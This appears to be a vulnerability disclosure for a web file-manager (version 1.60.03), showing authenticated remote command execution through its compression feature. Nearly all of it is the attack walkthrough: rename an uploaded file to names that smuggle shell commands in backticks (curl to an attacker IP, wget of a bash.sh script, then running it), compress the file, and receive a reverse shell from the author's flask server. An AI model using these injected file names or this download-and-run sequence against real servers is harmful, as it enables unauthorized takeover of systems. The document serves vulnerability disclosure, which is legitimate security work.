## ** Remote Command Execution**

This is a latest version （1.60.03 release）
![](https://secure2.wostatic.cn/static/5U6P3EB3wmHKFg9qFt7Cx9/image.png?auth_key=1757700093-jjYafxtyQB2ELRPQQWTn9G-0-3c6e1662c9f31fa34319b320b4a973ed)

Through the registration function, you can register a **normal account**

Enter your email address, the verification code you received, and the password you need to set. You can register a **normal account**

![](https://secure2.wostatic.cn/static/ip3dtWy71PcBTaT7upSbAh/image.png?auth_key=1757700093-cVBdBDHRrAEHFXryHoNDpp-0-73440f2959b810e69816481fcab4b3c6)

After registration, you can log in with this registered normal account

![](https://secure2.wostatic.cn/static/KC5Us2DPQu8F1tFbFAjKc/image.png?auth_key=1757700093-5iFyKMYnBxxctJd2YkvREX-0-5407702cd58516b0b6473cbfc7a6fb16)

In "My Files", upload a file:

![](https://secure2.wostatic.cn/static/dHAheft4onUYa9BFirB42p/image.png?auth_key=1757700093-n6wUbGNPNmrYfwmuwCXJms-0-dfa6f23bfeac5c36563624069176577c)

Through the rename operation, the file is renamed to a name with attack vectors:

![](https://secure2.wostatic.cn/static/keguh7gw4R4yMf499Ss1yc/image.png?auth_key=1757700093-m1Ff5zbt8CkvqJ5B3uyFnx-0-4ae318dc6dd79f70322ef1850025aa7e)

set    1111 \`curl+ip\`  

![](https://secure2.wostatic.cn/static/rGQ7PP7D9bqoV4nNi2249K/image.png?auth_key=1757700093-xtqxnWQXZ1Y5jc1nBQqpsb-0-6cd0aa1535040817ada15aa82b6ddcf4)

Then perform online compression

![](https://secure2.wostatic.cn/static/ae3BdnZ587yoK9xKs796f7/image.png?auth_key=1757700093-7MTQqvnq7eiz3RrxtZcLqJ-0-a0131fa66b47472620260f205f206d56)

After the compression is completed, it can be found that the attack server has received an http request message, indicating that there is a command execution vulnerability

![](https://secure2.wostatic.cn/static/cWzCvHsDsMAfzXbAKKCcac/image.png?auth_key=1757700093-3cSbRcTcMEQx1SZwT3LEUU-0-932f4b21bbab1e8daec98d09321819e3)

Here is the request  for the compression function

use:     **/?explorer/index/zip**  

(PS:  You cannot modify the malicious command directly in this request packet, it is invalid. You must first modify it to include the malicious command file name, and then compress it.)

![](https://secure2.wostatic.cn/static/wqyx4QBV6xmAhS115CSNng/image.png?auth_key=1757700093-5k39Fd28r1Qe8eM4XpZHJg-0-d98a6bf1b6d8f6f6a006f8b14be9bdf5)

Next I will create a series of attack vectors，until my attack machine gains access to the server.

I created a simple flask server on my attack machine that can directly download bash.sh

![](https://secure2.wostatic.cn/static/2dix9D93fYHGEERMJSgoJp/image.png?auth_key=1757700093-qjigtzFLTr9C6SUuQpdCew-0-73f2e633d7f42cdcaefd042be7a7a2f6)

The bash.sh content is a reverse shell:

![](https://secure2.wostatic.cn/static/i5VWqpX7i8wHpcGz9aKbdj/image.png?auth_key=1757700093-eBwi95c1cdE4xTkmhNaPEH-0-8071b710d19d47d5899f2abe4e95c8a6)

Start this flask server on my attack machine

![](https://secure2.wostatic.cn/static/mHSqgtgsoHULeCBGqrJRA6/image.png?auth_key=1757700093-obDnz7hE5nEesqJcFLRShj-0-0e4ddb213bd57aad4ef4d5e84c96aeff)

Next rename the files in the following order and compress them one by one

![](https://secure2.wostatic.cn/static/t6vr5iKkRWw4nPxqq19pcV/image.png?auth_key=1757700093-jYioWdzYoBHujHuEA145XA-0-f7e3e69c7808f68f62c27064982d92bd)

You can:

1.First change the file name to 1111\`wget -O bash.sh + ip\`, then compress it



2.Then change the file name to 1111\`bash bash.sh\` ,then compress it

![](https://secure2.wostatic.cn/static/oFJ7znVFCvmFJrRu68WsVC/image.png?auth_key=1757700093-ppP7Mzr6iqazhjfLBzwUzH-0-672fd9c98dff542365bd017f6205ed30)

After completing the above series of operations，

Finally my attacking machine receive a reverse shell:

![](https://secure2.wostatic.cn/static/hXTTLh57MiZY2Wmd2czMSL/image.png?auth_key=1757700093-cfKgK1yPSqszvC5Mrq4DEE-0-5374dabbcca6a45cf6b57b6f946e6367)
